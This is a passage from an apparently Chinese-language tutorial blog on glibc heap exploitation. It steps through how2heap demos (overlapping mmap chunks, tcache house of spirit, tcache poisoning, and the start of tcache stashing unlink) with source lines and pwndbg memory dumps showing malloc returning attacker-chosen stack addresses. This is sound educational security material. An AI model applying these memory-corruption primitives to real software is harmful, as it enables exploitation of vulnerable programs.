class="number">60</span> <span class="comment">// After this, all chunks are allocated downwards in memory towards the heap.</span></span><br><span class="line">► <span class="number">61</span> <span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">62</span> <span class="built_in">printf</span>(<span class="string">&quot;The second mmap chunk goes below LibC: %p\n&quot;</span>, mmap_chunk_2);</span><br><span class="line">  <span class="number">63</span></span><br><span class="line">  <span class="number">64</span> <span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">65</span> <span class="built_in">printf</span>(<span class="string">&quot;The third mmap chunk goes below the second mmap chunk: %p\n&quot;</span>, mmap_chunk_3);</span><br></pre></td></tr></table></figure><p>此时我们可以知道 mmap_chunk_3 的 preve size 和 size 分别为： 0 和 0x101002</p><p>假设我们此时有一个漏洞可以修改 preve_size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">88</span> <span class="comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span></span><br><span class="line">  <span class="number">89</span> <span class="comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span></span><br><span class="line">► <span class="number">90</span> mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">  <span class="number">91</span> <span class="built_in">printf</span>(<span class="string">&quot;New size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">  <span class="number">92</span> <span class="built_in">printf</span>(<span class="string">&quot;Free the third mmap chunk, which munmaps the second and third chunks\n\n&quot;</span>);</span><br><span class="line">  <span class="number">93</span></span><br><span class="line">  <span class="number">94</span> <span class="comment">/*</span></span><br></pre></td></tr></table></figure><p>我们将 prev_size 修改为 0x202002 , 然后我们 free mmap_chunk_3 , </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">102</span> Because of <span class="keyword">this</span> added restriction, the main goal is to get the memory back from the system</span><br><span class="line">  <span class="number">103</span> to have two pointers assigned to the same location.</span><br><span class="line">  <span class="number">104</span> */</span><br><span class="line">  <span class="number">105</span> <span class="comment">// Munmaps both the second and third pointers</span></span><br><span class="line">► <span class="number">106</span> <span class="built_in">free</span>(mmap_chunk_3);</span><br><span class="line">  <span class="number">107</span></span><br><span class="line">  <span class="number">108</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  109 Would crash, if on the following:</span></span><br><span class="line"><span class="comment">  110 mmap_chunk_2[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="comment">  111 This is because the memory would not be allocated to the current program.</span></span><br></pre></td></tr></table></figure><p>这个时候我们再 malloc 一个大小 0x300000 ， 由于前面发生的合并，所以我们会得到一个 重叠的 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">120</span> <span class="built_in">printf</span>(<span class="string">&quot;Get a very large chunk from malloc to get mmapped chunk\n&quot;</span>);</span><br><span class="line">   <span class="number">121</span> <span class="built_in">printf</span>(<span class="string">&quot;This should overlap over the previously munmapped/freed chunks\n&quot;</span>);</span><br><span class="line">   <span class="number">122</span> <span class="keyword">long</span> <span class="keyword">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line"> ► <span class="number">123</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr: %p\n&quot;</span>, overlapping_chunk);</span><br><span class="line">   <span class="number">124</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr Size: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line">   <span class="number">125</span></span><br><span class="line">     ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">     pwndbg&gt; p overlapping_chunk</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">long</span> <span class="keyword">long</span> *) <span class="number">0x7f78b3e60010</span></span><br><span class="line">pwndbg&gt; p/x overlapping_chunk[<span class="number">-1</span>]</span><br><span class="line">$<span class="number">8</span> = <span class="number">0x301002</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们修改 overlapping_chunk 的数据内容的同时，就是把 mmap_chunk_2 的值修改了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">135</span> <span class="comment">// Show that the pointer has been written to.</span></span><br><span class="line"> ► <span class="number">136</span> <span class="built_in">printf</span>(<span class="string">&quot;Second chunk value (after write): 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">137</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk value: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);</span><br><span class="line">   <span class="number">138</span> <span class="built_in">printf</span>(<span class="string">&quot;Boom! The new chunk has been overlapped with a previous mmaped chunk\n&quot;</span>);</span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p/x mmap_chunk_2[<span class="number">0</span>]</span><br><span class="line">$<span class="number">14</span> = <span class="number">0x1122334455667788</span></span><br></pre></td></tr></table></figure><h3 id="8-tcache-house-of-spirit"><a href="#8-tcache-house-of-spirit" class="headerlink" title="8. tcache_house_of_spirit"></a>8. tcache_house_of_spirit</h3><p>首先 malloc 一个 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12</span> <span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line">  <span class="number">13</span></span><br><span class="line">  <span class="number">14</span> <span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">15</span></span><br><span class="line">  <span class="number">16</span></span><br><span class="line">► <span class="number">17</span> <span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">  <span class="number">18</span> <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="number">19</span></span><br><span class="line">  <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>此时在栈上我们有一个可控目标</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="number">21</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="number">22</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br></pre></td></tr></table></figure><p>将这个可控目标伪造成一个一个chunk ，修改其大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">28</span> fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br></pre></td></tr></table></figure><p>free 这个伪造的 chunk ，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">34</span> a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">  <span class="number">35</span></span><br><span class="line">  <span class="number">36</span> <span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">  <span class="number">37</span> <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="number">38</span></span><br></pre></td></tr></table></figure><p>我们就会发现，在 tcache 上有一个栈地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x7ffe02d9aa00</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>此时，我们再malloc 一次，就能把这个栈地址拿回来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /pwn/tcache_house_of_spirit.c</span><br><span class="line">   <span class="number">38</span></span><br><span class="line">   <span class="number">39</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">40</span> <span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">   <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line">   <span class="number">42</span></span><br><span class="line"> ► <span class="number">43</span> assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">44</span> &#125;</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7ffe02d9a9e0</span> —▸ <span class="number">0x7ffe02d9aa00</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7ffe02d9a9f0</span> —▸ <span class="number">0x55c7abd8f040</span> ◂— <span class="number">0x400000006</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7ffe02d9a9f8</span> ◂— <span class="number">0x40</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7ffe02d9aa00</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7ffe02d9aa10</span> —▸ <span class="number">0x7ffe02d9aa36</span> ◂— <span class="number">0x55c7abd901200000</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7ffe02d9aa18</span> —▸ <span class="number">0x55c7abd9040d</span> (__libc_csu_init+<span class="number">77</span>) ◂— add    rbx, <span class="number">1</span></span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55</span>c7abd90368 main+<span class="number">351</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>432c2890b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">void</span> *) <span class="number">0x7ffe02d9aa00</span></span><br></pre></td></tr></table></figure><h3 id="9-tcache-poisoning"><a href="#9-tcache-poisoning" class="headerlink" title="9. tcache_poisoning"></a>9. tcache_poisoning</h3><p>通过劫持修改  tcache fd 的形式来，来获取一个目标地址,  这里的目标是一个栈地址， 作用于 8 挺相似的</p><p>malloc 两个 chunk ，分别为 a 和 b</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">21</span> <span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">  <span class="number">22</span> <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">  <span class="number">23</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">  <span class="number">24</span> <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">► <span class="number">25</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br></pre></td></tr></table></figure><p>然后再一次将他们 free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">27</span> <span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">   <span class="number">28</span> <span class="built_in">free</span>(a);</span><br><span class="line">   <span class="number">29</span> <span class="built_in">free</span>(b);</span><br><span class="line">   <span class="number">30</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x55ce97ce6330</span> —▸ <span class="number">0x55ce97ce62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>就有如上的链表结构，假设我们可以溢出第一个 chunk，那么们就能修改第二个 chunk 的fd ,则我们将 chunk b 的fd 修改为栈地址,此时 tcachebins 就变成如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/tcache_poisoning.c</span><br><span class="line">   <span class="number">30</span></span><br><span class="line">   <span class="number">31</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">   <span class="number">32</span> <span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="number">33</span>    <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">   <span class="number">34</span> b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"> ► <span class="number">35</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line">   <span class="number">36</span></span><br><span class="line">   <span class="number">37</span> <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">   <span class="number">38</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line">   <span class="number">39</span></span><br><span class="line">   <span class="number">40</span> <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fff96c64620</span> —▸ <span class="number">0x7f5ea82fbfc8</span> (__exit_funcs_lock) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rdx  <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fff96c64630</span> —▸ <span class="number">0x55ce97ce62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fff96c64638</span> —▸ <span class="number">0x55ce97ce6330</span> —▸ <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fff96c64640</span> —▸ <span class="number">0x7fff96c64740</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fff96c64648</span> ◂— <span class="number">0x6690dce44b0a5500</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│ rbp  <span class="number">0x7fff96c64650</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fff96c64658</span> —▸ <span class="number">0x7f5ea81320b3</span> (__libc_start_main+<span class="number">243</span>) ◂— mov    edi, eax</span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55</span>ce96f65343 main+<span class="number">314</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>5ea81320b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x55ce97ce6330</span> —▸ <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— ...</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>我们就发现 变成了 b —&gt; &amp;stack_var ,然后我们只需 malloc 两次就能将栈地址拿到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /pwn/tcache_poisoning.c</span><br><span class="line">   <span class="number">36</span></span><br><span class="line">   <span class="number">37</span> <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">   <span class="number">38</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line">   <span class="number">39</span></span><br><span class="line">   <span class="number">40</span> <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"> ► <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">   <span class="number">42</span> <span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line">   <span class="number">43</span></span><br><span class="line">   <span class="number">44</span> assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line">   <span class="number">45</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">46</span> &#125;</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp     <span class="number">0x7fff96c64620</span> —▸ <span class="number">0x7f5ea82fbfc8</span> (__exit_funcs_lock) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rax r8  <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7fff96c64630</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x7fff96c64638</span> —▸ <span class="number">0x55ce97ce6330</span> —▸ <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x7fff96c64640</span> —▸ <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x7fff96c64648</span> ◂— <span class="number">0x6690dce44b0a5500</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│ rbp     <span class="number">0x7fff96c64650</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7fff96c64658</span> —▸ <span class="number">0x7f5ea81320b3</span> (__libc_start_main+<span class="number">243</span>) ◂— mov    edi, eax</span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55</span>ce96f653a3 main+<span class="number">410</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>5ea81320b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">6</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x7fff96c64628</span></span><br></pre></td></tr></table></figure><h3 id="10-tcache-stashing-unlink-attack"><a href="#10-tcache-stashing-unlink-attack" class="headerlink" title="10. tcache_stashing_unlink_attack"></a>10. tcache_stashing_unlink_attack</h3><p>tcache 上的 stashing unlink attack</p><p>当你能够覆盖victor-&gt;bk指针时，可以使用这个技术。此外，至少需要用calloc分配一个chunk。</p><p>在glibc中，将smallbin放入tcache的机制给了我们发动攻击的机会. 这种技术允许我们把libc addr写到任何我们想要的地方，并在任何需要的地方创建一个假的chunk。在这种情况下，我们将在堆栈上创建一个假的chunk.</p><p>例如此时我们在栈上伪造一个 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">22</span>     stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx stack_var</span><br><span class="line"><span class="number">0x7fffea4571c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea4571d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00007fffea4571d0</span></span><br><span class="line"><span class="number">0x7fffea4571e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea4571f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457200</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457210</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457220</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span 